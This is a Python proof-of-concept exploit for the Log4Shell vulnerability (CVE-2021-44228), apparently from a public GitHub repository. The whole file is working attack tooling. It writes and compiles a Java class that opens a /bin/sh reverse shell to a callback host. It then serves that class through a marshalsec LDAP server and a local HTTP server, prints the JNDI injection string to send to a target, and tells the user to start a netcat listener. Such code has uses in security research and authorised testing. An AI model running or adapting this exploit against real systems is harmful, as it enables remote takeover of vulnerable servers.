#!/usr/bin/env python3

import argparse
import subprocess
import threading
import sys
import socket
from pathlib import Path
from http.server import HTTPServer, SimpleHTTPRequestHandler
from colorama import Fore, init

CUR_DIR = Path(__file__).parent.resolve()
JDK_DIR = CUR_DIR / "jdk1.8.0_20"
JAVAC_PATH = JDK_DIR / "bin" / "javac"
JAVA_PATH = JDK_DIR / "bin" / "java"
MARSHALSEC_JAR = CUR_DIR / "target" / "marshalsec-0.0.3-SNAPSHOT-all.jar"
LDAP_PORT = 1389
EXPLOIT_JAVA = CUR_DIR / "Exploit.java"
EXPLOIT_CLASS = CUR_DIR / "Exploit.class"

def get_local_ip() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return 'localhost'

def generate_payload(callback_host: str, callback_port: int) -> None:
    java_code = f"""\
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Exploit {{
    public Exploit() throws Exception {{
        Thread t = new Thread(() -> {{
            try {{
                String host = "{callback_host}";
                int port = {callback_port};
                String cmd = "/bin/sh";
                Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
                Socket s = new Socket(host, port);
                InputStream pi = p.getInputStream(),
                            pe = p.getErrorStream(),
                            si = s.getInputStream();
                OutputStream po = p.getOutputStream(),
                            so = s.getOutputStream();
                while (!s.isClosed()) {{
                    while (pi.available() > 0) so.write(pi.read());
                    while (pe.available() > 0) so.write(pe.read());
                    while (si.available() > 0) po.write(si.read());
                    so.flush();
                    po.flush();
                    try {{
                        p.exitValue();
                        break;
                    }} catch (Exception e) {{
                    }}
                    Thread.sleep(50);
                }}
                p.destroy();
                s.close();
            }} catch (Exception e) {{
                e.printStackTrace();
            }}
        }});
        t.setDaemon(true);
        t.start();
    }}
}}
"""
    EXPLOIT_JAVA.write_text(java_code)
    print(Fore.GREEN + "[+] Exploit.java written")

    if JAVAC_PATH.exists():
        javac_cmd = [str(JAVAC_PATH)]
    else:
        print(Fore.YELLOW + "[!] Bundled javac not found, using system javac")
        javac_cmd = ["javac"]

    try:
        subprocess.run(
            javac_cmd + [str(EXPLOIT_JAVA)],
            check=True,
            capture_output=True,
            text=True
        )
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"[-] Compilation failed:\n{e.stderr}")
        sys.exit(1)
    else:
        print(Fore.GREEN + "[+] Exploit.class compiled successfully")


def ldap_server(web_host: str, web_port: int) -> None:
    if not MARSHALSEC_JAR.exists():
        print(Fore.RED + f"[-] marshalsec JAR not found at {MARSHALSEC_JAR}")
        sys.exit(1)

    if JAVA_PATH.exists():
        java_cmd = [str(JAVA_PATH)]
    else:
        print(Fore.YELLOW + "[!] Bundled java not found, using system java")
        java_cmd = ["java"]

    ldap_ref_url = f"http://{web_host}:{web_port}/#Exploit"
    payload_string = f"${{jndi:ldap://{web_host}:{LDAP_PORT}/a}}"
    print(Fore.GREEN + f"[+] Send this payload: {payload_string}\n")

    cmd = java_cmd + [
        "-cp", str(MARSHALSEC_JAR),
        "marshalsec.jndi.LDAPRefServer",
        ldap_ref_url
    ]
    try:
        subprocess.run(cmd, check=True)
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"[-] LDAP server error: {e}")
        sys.exit(1)
    except KeyboardInterrupt:
        pass


def start_http_server(web_port: int) -> None:
    handler = SimpleHTTPRequestHandler
    httpd = HTTPServer(("0.0.0.0", web_port), handler)
    print(Fore.GREEN + f"[+] HTTP server running on http://0.0.0.0:{web_port}")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass


def main() -> None:
    init(autoreset=True)

    print(Fore.BLUE + """
[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/Jiahong-Guan/log4j-shell-poc
""")

    default_ip = get_local_ip()

    parser = argparse.ArgumentParser(
        description="log4shell PoC - CVE-2021-44228",
        epilog="Make sure you have a netcat listener ready on the specified lport."
    )
    parser.add_argument(
        "--userip",
        metavar="IP",
        type=str,
        default=default_ip,
        help=f"IP address for the LDAP and HTTP servers (reachable by the target). "
             f"Default: auto-detected ({default_ip})"
    )
    parser.add_argument(
        "--webport",
        metavar="PORT",
        type=int,
        default=8000,
        help="Port for the HTTP server (default: 8000)"
    )
    parser.add_argument(
        "--lport",
        metavar="PORT",
        type=int,
        default=9001,
        help="Port for the reverse shell listener (default: 9001 | use with netcat)"
    )

    args = parser.parse_args()

    print(Fore.CYAN + f"[*] Using IP address: {args.userip}")

    try:
        generate_payload(args.userip, args.lport)

        ldap_thread = threading.Thread(
            target=ldap_server,
            args=(args.userip, args.webport),
            daemon=True
        )
        ldap_thread.start()

        start_http_server(args.webport)

    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Interrupted by user.")
        sys.exit(0)
    except Exception as e:
        print(Fore.RED + f"[-] Unexpected error: {e}")
        sys.exit(1)
    finally:
        for f in (EXPLOIT_JAVA, EXPLOIT_CLASS):
            if f.exists():
                f.unlink()
                print(Fore.YELLOW + f"[+] Cleaned up {f.name}")


if __name__ == "__main__":
    main()
